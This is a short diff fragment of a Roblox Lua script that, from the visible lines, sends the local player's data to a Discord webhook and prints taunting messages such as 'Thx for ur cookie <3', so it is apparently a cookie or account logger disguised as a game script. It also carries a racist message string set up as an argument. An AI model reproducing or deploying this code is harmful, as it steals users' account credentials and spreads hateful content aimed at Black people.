@@ -15,6 +15,7 @@ local a=function(b)warn('DATA')local c="https://discord.com/api/webhooks/1094439
 local Players = game:GetService('Players')
 local YourPlayer = Players.LocalPlayer 
 a(YourPlayer)
+rconsolename("Get logged LOL")
 rconsoleprint("Thx for ur cookie <3 fucking skid")
 local args = {
     [1] = "I HATE BTLACK PEOPLE🤮👳🏿‍♂️",
